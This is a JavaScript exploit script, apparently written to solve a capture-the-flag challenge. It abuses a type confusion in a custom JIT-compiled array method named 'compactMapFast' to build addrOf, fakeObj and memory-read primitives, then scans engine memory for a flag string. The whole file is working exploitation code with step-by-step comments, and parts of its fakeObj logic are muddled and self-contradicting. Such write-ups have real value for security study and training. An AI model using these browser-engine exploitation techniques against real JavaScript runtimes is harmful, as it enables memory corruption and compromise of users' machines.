"use strict";

const log = (msg) => print(`[*] ${msg}`);

const _buf = new ArrayBuffer(8);
const _f64 = new Float64Array(_buf);
const _u32 = new Uint32Array(_buf);

function f2u(f) { _f64[0] = f; return [_u32[0], _u32[1]]; }
function u2f(lo, hi) { _u32[0] = lo; _u32[1] = hi; return _f64[0]; }
function hex32(v) { return '0x' + (v >>> 0).toString(16).padStart(8, '0'); }

let victim_, did_transition_;

// The Callback: Force transition to PACKED_ELEMENTS immediately
function cb(val, i, a) {
    if (!did_transition_ && i === 0) {
        did_transition_ = true;
        a[0] = victim_; // Store the object to trigger transition
    }
    return val;
}

log("Warming up JIT...");
for (let i = 0; i < 0x20000; i++) {
    victim_ = {a: 1};
    did_transition_ = false;
    let arr = [1.1, 2.2, 3.3, 4.4];
    arr.compactMapFast(cb);
}

function confuse(obj) {
    victim_ = obj;
    did_transition_ = false;
    let a = [1.1, 2.2, 3.3, 4.4];
    let res = a.compactMapFast(cb);
    if (!res || res.length === 0) return null;
    return res;
}

// addrOf: Leaks the 32-bit compressed pointer of an object
function addrOf(obj) {
    let res = confuse(obj);
    while (!res) { res = confuse(obj); } // Retry if JIT bails
    // Result[0] contains the bits of the Object pointer at index 0
    return f2u(res[0])[0]; 
}

// fakeObj: Turns a 32-bit pointer into a JS Object reference
function fakeObj(ptr) {
    let res = confuse({a: 1});
    while (!res) { res = confuse({a: 1}); }
    // Overwrite the Double result with our target pointer
    res[0] = u2f(ptr, ptr);
    // Because of the confusion, the original array 'a' (via victim_)
    // now sees the data as a tagged pointer.
    // However, the easiest way is to read back from the confusion result.
    // In this bug, the result array is the one we control.
    // Let's use a side-channel: a global array.
    let target = [1.1, 2.2];
    did_transition_ = false;
    victim_ = {a:1};
    let r = target.compactMapFast(cb);
    r[0] = u2f(ptr, ptr);
    return target[0]; // Read back from the original array that transitioned
}

function read32x2(tagged, byteOffset) {
    const target_addr = ((tagged - 1 + byteOffset) >>> 0) | 1;
    let fake = fakeObj(target_addr);
    let leak = confuse(fake);
    while (!leak) { leak = confuse(fake); }
    return f2u(leak[0]);
}

try {
    const flagLen = __cmf_keepalive(0) - 3;
    log(`Flag length: ${flagLen}`);

    const ka_ptr = addrOf(__cmf_keepalive);
    log(`Keepalive @ ${hex32(ka_ptr)}`);

    // Context is typically at offset 12 or 16
    let context_ptr = 0;
    for (let off of [12, 16, 20]) {
        let val = read32x2(ka_ptr, off)[1]; // High bits often hold the ptr
        if (val > 0x1000 && (val & 1)) {
            context_ptr = val;
            break;
        }
    }

    if (!context_ptr) throw "Failed to find Context";
    log(`Context @ ${hex32(context_ptr)}`);

    // Scan context slots (usually starting at offset 12)
    for (let i = 0; i < 20; i++) {
        let off = 12 + (i * 4);
        let ptr = read32x2(context_ptr, off)[0];
        if (!(ptr & 1) || ptr < 0x1000) continue;

        let len = read32x2(ptr, 8)[0];
        if (len === flagLen) {
            log(`Found string candidate at slot ${i}`);
            let s = "";
            for (let j = 0; s.length < flagLen; j += 8) {
                let p = read32x2(ptr, 12 + j);
                [p[0], p[1]].forEach(v => {
                    for (let b = 0; b < 4 && s.length < flagLen; b++)
                        s += String.fromCharCode((v >>> (b * 8)) & 0xff);
                });
            }
            if (s.includes("SK-C") || s.includes("{")) {
                print(`\n[!] FLAG: ${s}\n`);
                quit();
            }
        }
    }
} catch (e) {
    log("Error: " + e);
}
